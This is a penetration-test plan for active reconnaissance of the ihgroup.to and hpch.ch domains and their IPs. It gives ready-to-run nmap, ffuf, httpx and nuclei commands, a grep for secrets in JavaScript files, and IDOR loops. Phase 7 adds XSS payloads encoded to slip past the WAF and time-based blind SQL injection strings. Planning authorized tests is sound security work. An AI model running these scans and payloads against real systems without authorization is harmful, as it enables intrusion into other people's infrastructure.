# Active Reconnaissance Plan - Youness Pentest
**WAF-Aware Testing Strategy**

**Target**: ihgroup.to, hpch.ch infrastructure
**Date**: 2025-11-20
**Phase**: Active Reconnaissance (Pending Execution)
**Status**: 📋 Plan ready, awaiting approval

---

## Executive Summary

### Passive Reconnaissance Results
- ✅ **Platform**: Google Cloud Platform confirmed
- ⚠️ **WAF**: Google Cloud Armor **ACTIVE** (critical constraint)
- ✅ **SSL/TLS**: Strong configuration, Google Trust Services
- ✅ **Subdomains**: 6 total (3 per domain, all responsive)
- ⚠️ **Shared IPs**: Virtual hosting on 2 IPs

### Active Recon Objectives
1. Identify open ports and services (conservative port scan)
2. Test for database exposure (MySQL, PostgreSQL, MongoDB)
3. Discover web application endpoints and structure
4. Identify backend technologies and frameworks
5. Map authentication mechanisms
6. Locate potential attack surface (APIs, admin panels, uploads)

### Critical Constraints (Google Cloud Armor WAF)
- 🔴 **Browser User-Agent MANDATORY** for all HTTP requests
- 🔴 **Rate limiting REQUIRED**: ≤ 10 requests/second
- 🔴 **Scan delays MANDATORY**: ≥ 100ms between requests
- 🔴 **Conservative timing**: nmap -T2 or -T3 with delays
- 🔴 **Emergency stop**: If 403/429 errors occur

---

## Phase 1: Conservative Port Scanning

### 1.1 Primary Port Scan (T2 Timing)
**Risk Level**: 🟡 LOW (with proper timing)
**Estimated Duration**: 15-20 minutes per IP
**Tool**: nmap

#### Scan Configuration
```bash
# Define browser User-Agent for nmap scripts
BROWSER_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ihgroup.to (136.110.148.157) - Conservative scan
nmap -T2 -Pn --top-ports 1000 \
  --max-retries 2 \
  --host-timeout 15m \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_ihgroup_T2_top1000 \
  136.110.148.157

# hpch.ch (34.8.134.55) - Conservative scan
nmap -T2 -Pn --top-ports 1000 \
  --max-retries 2 \
  --host-timeout 15m \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_hpch_T2_top1000 \
  34.8.134.55
```

#### Expected Results
```
PORT     STATE    SERVICE
80/tcp   open     http         (likely redirect to 443)
443/tcp  open     https        (confirmed active)
3306/tcp filtered mysql        (database - should be filtered)
5432/tcp filtered postgresql   (database - should be filtered)
27017/tcp filtered mongodb     (database - should be filtered)
```

**Analysis Criteria**:
- Open ports → Investigate with service enumeration
- Filtered ports → GCP firewall protection (good security)
- Closed ports → Service not running

### 1.2 Database Port Specific Scan
**Risk Level**: 🟡 LOW
**Estimated Duration**: 5 minutes per IP
**Purpose**: Verify database exposure

```bash
# Test for common database ports (critical security finding if open)
nmap -T2 -Pn -p 3306,5432,27017,6379,9200,1433,5984 \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_ihgroup_database_ports \
  136.110.148.157

nmap -T2 -Pn -p 3306,5432,27017,6379,9200,1433,5984 \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_hpch_database_ports \
  34.8.134.55
```

**Database Ports Tested**:
- 3306: MySQL/MariaDB
- 5432: PostgreSQL
- 27017: MongoDB
- 6379: Redis
- 9200: Elasticsearch
- 1433: Microsoft SQL Server
- 5984: CouchDB

**Critical**: If any database port is open → **HIGH severity finding**

### 1.3 Web Service Enumeration
**Risk Level**: 🟡 LOW
**Estimated Duration**: 10 minutes per IP
**Purpose**: Identify web server details and technologies

```bash
# Service detection on confirmed web ports
nmap -T2 -Pn -p 80,443,8080,8443 -sV \
  --script http-headers,http-title,http-server-header \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_ihgroup_web_services \
  136.110.148.157

nmap -T2 -Pn -p 80,443,8080,8443 -sV \
  --script http-headers,http-title,http-server-header \
  --script-args "http.useragent='$BROWSER_UA'" \
  -oA nmap_hpch_web_services \
  34.8.134.55
```

---

## Phase 2: HTTP/HTTPS Service Analysis

### 2.1 HTTP to HTTPS Redirection Test
**Risk Level**: 🟢 ZERO (passive HTTP request)
**Tool**: curl

```bash
# Test HTTP (port 80) behavior - should redirect to HTTPS
curl -I http://test.ihgroup.to
curl -I http://test.hpch.ch

# Expected: 301/302 redirect to https:// or connection refused
```

**Analysis**:
- 301/302 → Proper HTTPS enforcement
- 200 OK → **MEDIUM severity** (cleartext HTTP accepted)
- Connection refused → Port 80 closed (acceptable)

### 2.2 Web Technology Detection (httpx)
**Risk Level**: 🟡 LOW
**Estimated Duration**: 5 minutes
**Tool**: httpx with rate limiting

```bash
# Create target list from subdomains
cat subdomains_ihgroup.txt subdomains_hpch.txt > all_targets.txt

# Probe with browser User-Agent and rate limiting
httpx -l all_targets.txt \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -status-code -tech-detect -title -content-length \
  -follow-redirects -json \
  -rate-limit 5 \
  -timeout 15 \
  -o httpx_results.json

# Human-readable output
httpx -l all_targets.txt \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -status-code -tech-detect -title -content-length \
  -rate-limit 5 \
  -o httpx_results.txt
```

**Expected Technologies**:
- Server: Google Frontend (confirmed)
- Framework: Unknown (requires deeper inspection)
- CMS: Unknown
- Frontend libraries: Unknown (JavaScript analysis needed)

---

## Phase 3: Content Discovery

### 3.1 Directory and File Enumeration (ffuf)
**Risk Level**: 🟠 MODERATE (WAF may detect aggressive patterns)
**Estimated Duration**: 20-30 minutes per domain
**Tool**: ffuf with conservative settings

#### Configuration
```bash
BROWSER_UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# Small wordlist first (test WAF tolerance)
ffuf -u https://test.ihgroup.to/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -H "User-Agent: $BROWSER_UA" \
  -mc 200,201,202,204,301,302,307,401,403,405 \
  -rate 5 -p 0.5 -t 5 \
  -o ffuf_ihgroup_common.json -of json

# If no blocking, proceed with larger wordlist
ffuf -u https://test.ihgroup.to/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -H "User-Agent: $BROWSER_UA" \
  -mc 200,201,202,204,301,302,307,401,403,405 \
  -rate 5 -p 0.5 -t 5 \
  -o ffuf_ihgroup_medium.json -of json
```

**Monitoring**:
- Watch for 403 responses (WAF blocking)
- If 403 increases → STOP and reduce rate
- If 429 occurs → STOP, wait 10 minutes, retry with rate/2

#### Targets to Discover
```
High-Priority Endpoints:
/admin, /administrator, /admin.php, /wp-admin
/api, /api/v1, /api/v2, /graphql
/login, /signin, /auth, /oauth
/upload, /uploads, /files
/config, /configuration, /.env
/backup, /backups, /db
/test, /dev, /staging
/phpmyadmin, /adminer, /sql
```

### 3.2 API Endpoint Discovery
**Risk Level**: 🟡 LOW
**Tool**: Manual + ffuf

```bash
# Test common API paths
for path in api api/v1 api/v2 graphql rest; do
  echo "Testing: https://test.ihgroup.to/$path"
  curl -I -H "User-Agent: $BROWSER_UA" "https://test.ihgroup.to/$path"
  sleep 1
done

# API-specific wordlist
ffuf -u https://test.ihgroup.to/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -H "User-Agent: $BROWSER_UA" \
  -mc 200,201,202,204,400,401,403,405,500 \
  -rate 5 -p 0.5 \
  -o ffuf_ihgroup_api.json -of json
```

### 3.3 File Extension Discovery
**Risk Level**: 🟡 LOW
**Purpose**: Identify backend technology

```bash
# Test common extensions on known paths
extensions="php asp aspx jsp py rb js json xml html htm txt pdf"

for ext in $extensions; do
  echo "Testing extension: $ext"
  curl -I -H "User-Agent: $BROWSER_UA" "https://test.ihgroup.to/index.$ext"
  sleep 1
done
```

---

## Phase 4: JavaScript Analysis

### 4.1 JavaScript File Discovery
**Risk Level**: 🟢 ZERO (passive retrieval)
**Tool**: Manual analysis + curl

```bash
# Download main page HTML
curl -H "User-Agent: $BROWSER_UA" https://test.ihgroup.to -o test_ihgroup_index.html

# Extract JavaScript file URLs
grep -oP 'src="[^"]*\.js"' test_ihgroup_index.html | cut -d'"' -f2 > js_files_ihgroup.txt

# Download JavaScript files for analysis
while read js_url; do
  filename=$(basename "$js_url")
  curl -H "User-Agent: $BROWSER_UA" "$js_url" -o "js_files/$filename"
  sleep 0.5
done < js_files_ihgroup.txt
```

### 4.2 JavaScript Secrets Scanning
**Risk Level**: 🟢 ZERO (local analysis)
**Tool**: grep, nuclei, or custom regex

```bash
# Search for API keys, tokens, credentials in JavaScript files
grep -rE "(api[_-]?key|apikey|api[_-]?secret|bearer|token|access[_-]?token|auth|password|secret)" js_files/ -i

# Search for endpoints and URLs
grep -rE "(https?://[a-zA-Z0-9./-]+|/api/[a-zA-Z0-9/-]+)" js_files/ -o | sort -u > discovered_endpoints.txt
```

**High-Value Targets**:
- API keys (AWS, Google Cloud, third-party services)
- OAuth tokens
- Internal API endpoints
- Admin panel URLs
- Debug/development endpoints

---

## Phase 5: Authentication Mechanism Analysis

### 5.1 Login Endpoint Discovery
**Risk Level**: 🟡 LOW
**Tool**: Manual + ffuf

```bash
# Test common login paths
login_paths="login signin sign-in auth authenticate oauth login.php admin/login user/login account/login"

for path in $login_paths; do
  echo "Testing: https://test.ihgroup.to/$path"
  curl -I -H "User-Agent: $BROWSER_UA" "https://test.ihgroup.to/$path"
  sleep 1
done
```

### 5.2 Authentication Method Identification
**Risk Level**: 🟢 ZERO (passive observation)

**Methods to Identify**:
1. **Form-based authentication** (POST to /login)
2. **HTTP Basic/Digest authentication** (WWW-Authenticate header)
3. **OAuth/OAuth2** (redirect to authorization server)
4. **API key authentication** (X-API-Key header)
5. **JWT tokens** (Authorization: Bearer header)
6. **Session cookies** (Set-Cookie with session ID)

**Analysis Steps**:
```bash
# Test login page (if found)
curl -H "User-Agent: $BROWSER_UA" https://test.ihgroup.to/login -v 2>&1 | grep -E "(Set-Cookie|WWW-Authenticate|X-|Authorization)"

# Check for OAuth endpoints
curl -H "User-Agent: $BROWSER_UA" https://test.ihgroup.to/.well-known/openid-configuration
```

---

## Phase 6: Vulnerability Scanning (Conservative)

### 6.1 Nuclei CVE Scan
**Risk Level**: 🟠 MODERATE
**Estimated Duration**: 30-45 minutes
**Tool**: nuclei with aggressive rate limiting

```bash
# Create target list
echo "https://test.ihgroup.to" > nuclei_targets.txt
echo "https://test.hpch.ch" >> nuclei_targets.txt

# Conservative scan: Critical and High severity only
nuclei -l nuclei_targets.txt \
  -t nuclei-templates/cves/ \
  -severity critical,high \
  -rl 5 -delay 500ms -timeout 15 -retries 2 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -o nuclei_cves_conservative.txt \
  -json -jo nuclei_cves_conservative.json

# If no WAF blocking, expand to Medium severity
nuclei -l nuclei_targets.txt \
  -t nuclei-templates/cves/ \
  -severity critical,high,medium \
  -rl 5 -delay 500ms -timeout 15 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -o nuclei_cves_full.txt \
  -json -jo nuclei_cves_full.json
```

### 6.2 Technology-Specific Nuclei Scan
**Risk Level**: 🟡 LOW
**Purpose**: Scan for vulnerabilities in identified technologies

```bash
# Once technologies are identified, run targeted scans
# Example: If framework is identified as Django, Laravel, etc.
nuclei -l nuclei_targets.txt \
  -t nuclei-templates/technologies/[identified-tech]/ \
  -rl 5 -delay 500ms \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -o nuclei_tech_scan.txt
```

---

## Phase 7: Input Validation Testing (WAF-Aware)

### 7.1 XSS Testing (Encoded Payloads)
**Risk Level**: 🟠 MODERATE (WAF will likely detect)
**Strategy**: Use encoding and obfuscation to bypass WAF

```bash
# Basic XSS test (URL-encoded)
curl -H "User-Agent: $BROWSER_UA" \
  "https://test.ihgroup.to/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" \
  -o xss_test_basic.html

# Advanced XSS with encoding variations
payloads=(
  "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"
  "%3Csvg%20onload%3Dalert%281%29%3E"
  "%3Cscript%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2Fscript%3E"
)

for payload in "${payloads[@]}"; do
  echo "Testing payload: $payload"
  curl -H "User-Agent: $BROWSER_UA" \
    "https://test.ihgroup.to/search?q=$payload" \
    -o "xss_test_$(echo $payload | md5sum | cut -d' ' -f1).html"
  sleep 2
done
```

**Analysis**: Search response HTML for reflected/unescaped payload

### 7.2 SQL Injection Testing (Time-Based Blind)
**Risk Level**: 🔴 HIGH (aggressive detection by WAF)
**Strategy**: Use time-based blind SQLi to minimize WAF detection

```bash
# Time-based blind SQLi (less detectable)
# MySQL time delay
time curl -H "User-Agent: $BROWSER_UA" \
  "https://test.ihgroup.to/page?id=1' AND SLEEP(5)--"

# PostgreSQL time delay
time curl -H "User-Agent: $BROWSER_UA" \
  "https://test.ihgroup.to/page?id=1'; SELECT pg_sleep(5)--"

# Measure response time:
# - Normal: < 1 second
# - Vulnerable: ≥ 5 seconds
```

**WARNING**: SQLi testing highly likely to trigger WAF. Use only after exhausting other vectors.

---

## Phase 8: Business Logic Testing

### 8.1 IDOR Testing (If endpoints found)
**Risk Level**: 🟡 LOW
**Purpose**: Test for Insecure Direct Object References

```bash
# Example: If user profile endpoint found
# Test sequential IDs
for id in {1..10}; do
  echo "Testing ID: $id"
  curl -H "User-Agent: $BROWSER_UA" \
    "https://test.ihgroup.to/api/users/$id" \
    -b "session_cookie_if_available"
  sleep 1
done
```

### 8.2 Authorization Bypass Testing
**Risk Level**: 🟡 LOW
**Purpose**: Test for horizontal/vertical privilege escalation

```bash
# Test access to admin endpoints without authentication
admin_endpoints="/admin /admin/dashboard /admin/users /api/admin"

for endpoint in $admin_endpoints; do
  echo "Testing: $endpoint"
  curl -I -H "User-Agent: $BROWSER_UA" \
    "https://test.ihgroup.to$endpoint"
  sleep 1
done
```

---

## Testing Timeline

### Day 1: Conservative Port Scanning (2-3 hours)
- [x] Passive reconnaissance (COMPLETE)
- [ ] Port scan - ihgroup.to (20 minutes)
- [ ] Port scan - hpch.ch (20 minutes)
- [ ] Database port verification (10 minutes)
- [ ] Web service enumeration (20 minutes)
- [ ] HTTP to HTTPS redirection test (5 minutes)
- [ ] httpx technology detection (10 minutes)

### Day 2: Content Discovery (3-4 hours)
- [ ] Directory enumeration - ihgroup.to (60 minutes)
- [ ] Directory enumeration - hpch.ch (60 minutes)
- [ ] API endpoint discovery (30 minutes)
- [ ] File extension testing (20 minutes)
- [ ] JavaScript analysis (60 minutes)

### Day 3: Authentication & Vulnerability Scanning (3-4 hours)
- [ ] Login endpoint discovery (30 minutes)
- [ ] Authentication mechanism analysis (30 minutes)
- [ ] Nuclei CVE scan (45 minutes)
- [ ] Technology-specific scanning (30 minutes)
- [ ] Business logic testing (60 minutes)

### Day 4: Input Validation Testing (2-3 hours)
- [ ] XSS testing with encoded payloads (60 minutes)
- [ ] SQL injection testing (conservative) (60 minutes)
- [ ] IDOR testing (30 minutes)
- [ ] Authorization bypass testing (30 minutes)

**Total Estimated Duration**: 10-14 hours (conservative approach due to WAF)

---

## WAF Monitoring & Emergency Procedures

### Real-Time Monitoring
**During all testing, monitor for**:
```bash
# Watch for 403/429 errors in real-time
tail -f /var/log/testing.log | grep -E "(403|429)"

# Monitor response times (slow responses = potential blocking)
# Normal: < 500ms
# Warning: > 1000ms
# Blocked: > 5000ms or timeout
```

### Emergency Stop Criteria
**STOP IMMEDIATELY if**:
1. ≥ 3 consecutive 403 Forbidden responses
2. Any 429 Too Many Requests response
3. Connection timeouts increase > 20%
4. Response times increase > 5x baseline
5. Complete loss of connectivity to target

### Recovery Procedure
1. **STOP** all scanning tools
2. **WAIT** 10 minutes minimum
3. **TEST** with single manual request:
   ```bash
   curl -I -H "User-Agent: $BROWSER_UA" https://test.ihgroup.to
   ```
4. **VERIFY** response is 200 OK
5. **REDUCE** scan rate by 50% before resuming
6. **CONTACT** target owner if blocking persists

---

## Success Criteria

### Minimum Requirements
- [ ] Port scan completed for both IPs
- [ ] Database exposure verified (all ports filtered = success)
- [ ] Web technologies identified
- [ ] Content discovery attempted (even if limited by WAF)
- [ ] Authentication mechanism documented
- [ ] At least one vulnerability scanning method completed

### Ideal Outcome
- [ ] Complete port scan without WAF blocking
- [ ] Comprehensive content discovery
- [ ] All authentication mechanisms identified
- [ ] Nuclei scan completed successfully
- [ ] Business logic tests performed
- [ ] Input validation testing completed
- [ ] Zero IP blocking incidents

---

## Next Steps After Active Recon

### If Database Ports are Open
1. 🔴 **CRITICAL**: Immediately document as HIGH severity finding
2. Test for default credentials
3. Test for authentication bypass
4. Test for SQL injection (if web app connects to DB)
5. Prepare detailed vulnerability report

### If Admin Panels Found
1. Document all discovered admin endpoints
2. Test for default credentials
3. Test for authentication bypass
4. Test for authorization bypass (horizontal/vertical privilege escalation)

### If APIs Found
1. Document all API endpoints and methods
2. Test for authentication bypass
3. Test for authorization bypass (IDOR, privilege escalation)
4. Test for input validation (injection, XSS)
5. Test for business logic flaws

---

**Last Updated**: 2025-11-20 18:30 UTC
**Status**: 📋 Plan ready, awaiting execution approval
**Next Action**: Execute Phase 1 (Conservative Port Scanning)
